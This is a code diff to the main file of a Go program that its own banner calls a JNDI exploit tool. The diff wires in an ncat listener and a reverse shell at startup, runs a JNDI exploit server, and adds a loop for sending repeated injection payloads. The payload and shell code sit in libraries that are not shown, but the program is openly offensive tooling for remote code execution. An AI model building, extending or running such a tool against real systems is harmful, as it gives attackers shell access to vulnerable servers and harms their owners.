@@ -1,22 +1,37 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"myapp/lib/execjndi"
+	"myapp/lib/ncat"
 	"myapp/lib/payload"
+	"myapp/lib/reverseshell"
 	"myapp/lib/sysinfo"
+	"os"
 )
 
 func main() {
 	banner()
-
+	ncat.StartNcat()
+	reverseshell.ReverseShell()
 	startPayload := make(chan bool)
 	go func() {
 		execjndi.ExecJNDI(startPayload)
 	}()
 	go func() {
 		<-startPayload
-		payload.PayloadInput()
+		for {
+			payload.PayloadInput()
+			fmt.Println("Do you want to send another payload? (yes/no)")
+			scanner := bufio.NewScanner(os.Stdin)
+			if scanner.Scan() {
+				response := scanner.Text()
+				if response != "yes" {
+					break
+				}
+			}
+		}
 	}()
 	select {}
 }
@@ -35,7 +50,7 @@ func banner() {
 	fmt.Println("------------------------------------------------------------------")
 	fmt.Println("This is a JNDI exploit tool.")
 	fmt.Println("This tool will start a JNDI exploit server and generate a payload.")
-	fmt.Println("Prefix with" + Red + " [+] " + Reset + "related to JNDI exploit server.")
+	fmt.Println("Prefix with" + Red + " [+] " + Reset + "related to starting server.")
 	fmt.Println("------------------------------------------------------------------")
 	sysinfo.ListInfo()
 	fmt.Println("------------------------------------------------------------------")
